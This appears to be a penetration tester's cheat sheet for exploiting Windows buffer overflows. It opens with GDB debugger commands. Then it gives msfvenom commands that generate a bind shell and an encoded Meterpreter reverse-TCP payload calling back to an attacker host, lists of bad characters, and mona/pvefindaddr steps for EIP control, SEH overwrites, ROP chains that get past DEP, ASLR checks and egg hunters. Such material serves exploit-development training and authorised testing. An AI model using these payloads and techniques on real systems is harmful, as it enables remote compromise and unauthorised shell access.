# BOF
    - —————————————————————————————————
## GDB Debugger Commands
        - # Setting Breakpoint break *_start
        - # Execute Next Instruction next
        - step
        - n
        - s
        - # Continue Execution continue
        - c
        - # Data
        - checking 'REGISTERS' and 'MEMORY'
        - # Display Register Values: (Decimal,Binary,Hex)
        - print print print O/P : (gdb) $17 = (gdb) $18 = (gdb) $19 = (gdb)
        - /d –> Decimal /t –> Binary /x –> Hex
        - print /d $eax 13
        - print /t $eax 1101
        - print /x $eax 0xd
        - # Display values of
        - command : x/nyz (Examine)
        - n –> Number of fields to display ==>
        - y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
        - z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
## Win Buffer Overflow Exploit Commands
        - msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
        - msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c
        - crontabs for all users including AD
        - COMMONLY USED BAD CHARACTERS: \x00\x0a\x0d\x20 \x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c
        - For http request Ending with (0\n\r_)
        - # Useful Commands:
        - pattern create
        - pattern offset (EIP Address)
        - pattern offset (ESP Address)
        - add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
        - !pvefindaddr pattern_create 5000 !pvefindaddr suggest !pvefindaddr modules !pvefindaddr nosafeseh
        - !mona config -set workingfolder C:\Mona\%p !mona config -get workingfolder
        - !mona mod
        - !mona bytearray -b "\x00\x0a"
        - !mona pc 5000 !mona po EIP !mona suggest
## SEH - Structured Exception Handling
        - # https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH !mona suggest
        - !mona nosafeseh
        - nseh="\xeb\x06\x90\x90" (next seh chain)
        - iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
## ROP (DEP)
        - # https://en.wikipedia.org/wiki/Return-oriented_programming # https://en.wikipedia.org/wiki/Data_Execution_Prevention !mona modules
        - !mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
        - !mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
## ASLR - Address space layout randomization
        - # https://en.wikipedia.org/wiki/Address_space_layout_randomization !mona noaslr
## EGG Hunter techniques
        - # https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/ # http://www.fuzzysecurity.com/tutorials/expDev/4.html
        - !mona jmp -r esp
        - !mona egg -t lxxl
        - \xeb\xc4 (jump backward -60) buff=lxxllxxl+shell
        - !mona egg -t 'w00t'
## NASM Commands
        - nasm -f bin -o payload.bin payload.asm
        - nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
